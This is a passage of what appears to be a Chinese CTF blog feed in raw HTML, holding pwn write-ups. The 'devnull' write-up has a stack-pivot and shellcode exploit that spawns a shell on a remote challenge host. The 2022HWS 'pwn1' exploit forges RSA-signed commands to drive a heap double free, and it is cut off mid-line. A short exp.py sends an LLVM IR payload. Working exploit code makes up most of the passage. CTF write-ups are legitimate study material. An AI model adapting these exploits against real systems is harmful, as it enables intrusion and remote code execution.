class="hljs-comment"> 0x4bb7e3 &lt;main+11507&gt;    call   llvm::legacy::PassManager::run(llvm::Module&amp;)@plt  </span><br><span class="hljs-comment"> ► 0x7ffff4e20b48 &lt;llvm::legacy::PassManagerImpl::run(llvm::Module&amp;)+744&gt;    call   qword ptr [rax + 0x88]        &lt;llvm::FPPassManager::runOnModule(llvm::Module&amp;)&gt;</span><br><span class="hljs-comment">x/50xg 0x7ffff3d6d978</span><br><span class="hljs-comment">0x7ffff3d6d9a8 &lt;cmd&gt;:0x0000000000824d000x0000000000822fb0</span><br><span class="hljs-comment">0x7ffff3d6d9b8:0x00000000000000000x6868686868d06868</span><br><span class="hljs-comment">0x7ffff3d6d9c8 &lt;weaponlist+8&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6d9d8 &lt;weaponlist+24&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6d9e8 &lt;weaponlist+40&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6d9f8 &lt;weaponlist+56&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da08 &lt;weaponlist+72&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da18 &lt;weaponlist+88&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da28 &lt;weaponlist+104&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da38 &lt;weaponlist+120&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da48 &lt;weaponlist+136&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da58 &lt;weaponlist+152&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da68 &lt;weaponlist+168&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da78 &lt;weaponlist+184&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da88 &lt;weaponlist+200&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> </span><br><span class="hljs-comment">wea 2169C0  2169A8</span><br><span class="hljs-comment"> </span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h4 id="exp-py"><a class="header-anchor" href="#exp-py">¶</a><a href="http://exp.py">exp.py</a></h4><p>用来攻击远程的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python exp.py 123.56.105.22 35252</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(sys.argv[<span class="hljs-number">1</span>], sys.argv[<span class="hljs-number">2</span>])<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./exp.ll&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)<br><br>payload=f.read()<br><br>f.close()<br><br>payload2 = payload.encode(<span class="hljs-string">&quot;base64&quot;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;give&quot;</span>, payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="devnull"><a class="header-anchor" href="#devnull">¶</a>devnull</h3><h4 id="分析-v3"><a class="header-anchor" href="#分析-v3">¶</a>分析</h4><p>存在栈溢出，可以覆盖掉 fd 的同时覆盖掉 rbp 和 rip，考虑栈迁移。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731133726905.png" alt="devnull1"></p><p>看到控制执行流时 rdx 为 7。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731133853102.png" alt="devnull2"></p><p>比较突兀的 strlen 中，有控制 rax 的 gadget。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731133935959.png" alt="devnull3"></p><p>配合 mprotect 可以扬成 rwx 权限。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731134022615.png" alt="devnull4"></p><p>读入第一段 shellcode 扩大输入字节数，然后直接调 <a href="http://shellcraft.sh">shellcraft.sh</a>() 即可，注意的是输出流被关闭了，执行 <code>exec 1&gt;&amp;0</code> 恢复就行。</p><h4 id="Exp-v2"><a class="header-anchor" href="#Exp-v2">¶</a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/pwn/source/glibc-2.35/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdbscript += <span class="hljs-string">&#x27;b fprintf&#x27;</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./devnull&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./devnull&#x27;)</span><br><span class="hljs-comment"># debug(0x4014E3)</span><br>p = remote(<span class="hljs-string">&#x27;47.94.166.51&#x27;</span>,<span class="hljs-number">33797</span>)<br>addr = <span class="hljs-number">0x3fe000</span> + <span class="hljs-number">0x500</span><br>leave_ret = <span class="hljs-number">0x401511</span><br>rax_leave_ret = <span class="hljs-number">0x401350</span> <span class="hljs-comment"># mov rax, [rbp+s];leave;ret;</span><br>len_rax_mprotect = <span class="hljs-number">0x4012D0</span> <span class="hljs-comment"># len = 0x1000 addr = rax mprotect</span><br><span class="hljs-comment"># sea(&quot;please input your filename\n&quot;,&#x27;/bin/sh\0&#x27;.ljust(0x20,&#x27;\0&#x27;)+&#x27;\x00&#x27;+&#x27;\0&#x27;*0x13+p64(0x404010))</span><br>sea(<span class="hljs-string">&quot;please input your filename\n&quot;</span>,<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>.ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\0&#x27;</span>*(<span class="hljs-number">0x1c</span>-<span class="hljs-number">8</span>)+p64(addr)+p64(addr+<span class="hljs-number">0x18</span>)+p64(rax_leave_ret))<br>shellcode = asm(<br>  <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  push 0</span><br><span class="hljs-string">  pop rax</span><br><span class="hljs-string">  xchg rdi,rsi</span><br><span class="hljs-string">  xchg rdi,rdx</span><br><span class="hljs-string">  push 0</span><br><span class="hljs-string">  pop rdi</span><br><span class="hljs-string">  syscall</span><br><span class="hljs-string">  &#x27;&#x27;&#x27;</span><br>)<br>payload = p64(<span class="hljs-number">0x3fe000</span>) <span class="hljs-comment"># rax</span><br>payload = payload.ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>payload += p64(len_rax_mprotect) + p64(<span class="hljs-number">0</span>) + p64(addr+<span class="hljs-number">0x38</span>) + shellcode<br>sea(<span class="hljs-string">&quot;please input your new data\n&quot;</span>,payload)<br><br>sleep(<span class="hljs-number">2</span>)<br><span class="hljs-comment"># sl(&#x27;\0&#x27;*0x546+asm(shellcraft.cat(&#x27;./flag&#x27;,fd=2)))</span><br><span class="hljs-comment"># sl(&#x27;\0&#x27;*0x546+asm(shellcraft.write(2,&#x27;rsp&#x27;,&#x27;0x50&#x27;)))</span><br>sl(<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x546</span>+asm(shellcraft.sh()))<br>sleep(<span class="hljs-number">2</span>)<br>sl(<span class="hljs-string">&#x27;exec 1&gt;&amp;0&#x27;</span>)<br>sleep(<span class="hljs-number">2</span>)<br>sl(<span class="hljs-string">&#x27;cat flag&#x27;</span>)<br>p.interactive()<br><br><br></code></pre></td></tr></table></figure><p>什么，你说复现哪去了？在学了在学了。（悲</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2022HWS 夏令营入营赛 Pwn 题解</title>
    <link href="/posts/cb6560d6.html"/>
    <url>/posts/cb6560d6.html</url>
    
    <content type="html"><![CDATA[<p>和强网杯撞了，浅浅做完了pwn，其他的也不大会。</p><p>最近有点摸 wp 没有仔细整理，师傅们看看看看思路就行。</p><h1>PWN</h1><h2 id="pwn1"><a class="header-anchor" href="#pwn1">¶</a>pwn1</h2><p>二血题</p><p>难点在交互，解决了 RSA 之后就比较好做了，采取的是在处理函数内部下断点，dump 出 n 和 e 的思路。</p><p>漏洞点在 free 时没有清空 content 指针，可以河里堆风水进行 Double Free。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220729192811416.png" alt="pwn1"></p><p>最后拿的 Fastbin Reverse Into Tcache 打 one gadget ，顺利拿到了 shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;tcp.dasc.buuoj.cn&#x27;</span>,<span class="hljs-number">27495</span>)<br>P = <span class="hljs-number">16617127</span><br>Q = <span class="hljs-number">7578299081774973675168926220497127633745768478826174746554492422165802765780212810518589529228694315205511189705177457329278843566817056465274478392762585485827514172817826950842752547461016536920016232514874472692360067934908514830732106744500567245807025552586514363470336002166323093239378322678157</span><br>N = P*Q<br>PHI = (P-<span class="hljs-number">1</span>)*(Q-<span class="hljs-number">1</span>)<br>D = invmod(<span class="hljs-number">0x10001</span>,PHI)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size=<span class="hljs-number">0x10</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,tf=<span class="hljs-string">&#x27;n&#x27;</span>,name=<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">40</span></span>):<br>    msg = <span class="hljs-built_in">str</span>(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;\n&#x27;</span> + name<br>    msg = n2s((<span class="hljs-built_in">pow</span>(s2n(msg),D,N)))<br>    lg(<span class="hljs-string">&#x27;LEN&#x27;</span>,<span class="hljs-built_in">len</span>(msg))<br>    sea(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(msg).rjust(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>    <span class="hljs-keyword">if</span> tf == <span class="hljs-string">&#x27;y&#x27;</span>:<br>        sla(<span class="hljs-string">&#x27;Want to add description?(y/n) &#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>)<br>        sea(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>        sea(<span class="hljs-string">&#x27;content: &#x27;</span>,<span class="hljs-built_in">str</span>(content))<br>    <span class="hljs-keyword">else</span>:<br>        sla(<span class="hljs-string">&#x27;Want to add description?(y/n) &#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">name</span>):<br>    msg = <span class="hljs-built_in">str</span>(<span class="hljs-number">0x102</span>) + <span class="hljs-string">&#x27;\n&#x27;</span> + name<br>    msg = n2s((<span class="hljs-built_in">pow</span>(s2n(msg),D,N)))<br>    lg(<span class="hljs-string">&#x27;LEN&#x27;</span>,<span class="hljs-built_in">len</span>(msg))<br>    sea(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(msg).rjust(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    msg = <span class="hljs-built_in">str</span>(<span class="hljs-number">0x105</span>) + <span class="hljs-string">&#x27;\n&#x27;</span> + <span class="hljs-string">&#x27;\0&#x27;</span><br>    msg = n2s((<span class="hljs-built_in">pow</span>(s2n(msg),D,N)))<br>    lg(<span class="hljs-string">&#x27;LEN&#x27;</span>,<span class="hljs-built_in">len</span>(msg))<br>    sea(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(msg).rjust(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">name,data</span>):<br>    msg = <span class="hljs-built_in">str</span>(<span class="hljs-number">0x201</span>) + <span class="hljs-string">&#x27;\n&#x27;</span> + name + <span class="hljs-string">&#x27;;&#x27;</span> + data<br>    msg = n2s((<span class="hljs-built_in">pow</span>(s2n(msg),D,N)))<br>    lg(<span class="hljs-string">&#x27;LEN&#x27;</span>,<span class="hljs-built_in">len</span>(msg))<br>    sea(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(msg).rjust(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><br>msg = <span class="hljs-built_in">str</span>(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;\n&#x27;</span> + <span class="hljs-string">&#x27;\0&#x27;</span><br>msg = n2s((<span class="hljs-built_in">pow</span>(s2n(msg),D,N)))<br><span class="hljs-comment"># msg = pack(msg)</span><br><span class="hljs-comment"># msg = cyclic(0x100)</span><br><span class="hljs-comment"># x/20xg $rebase(0x206090)</span><br><span class="hljs-comment"># x/20xg $rebase(0x206140)</span><br><span class="hljs-comment"># tel 0x7fffffffdd10 20</span><br><span class="hljs-comment"># add(0x10,name=&#x27;AB1&#x27;)</span><br><span class="hljs-comment"># x/20xg $rebase(0x2060A0)</span><br>add(<span class="hljs-number">0x450</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>,name=<span class="hljs-string">&#x27;FK1&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;NM1&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;ND1&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x01&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x02&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x10</span>,name=<span class="hljs-string">&#x27;FK2&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;NM2&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;ND2&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x03&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x04&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><br><br>dele(<span class="hljs-string">&#x27;FK1&#x27;</span>)<br>add(<span class="hljs-number">0x420</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>,name=<span class="hljs-string">&#x27;FK1&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;NM1&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;ND1&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x01&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x02&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><br>show()<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span 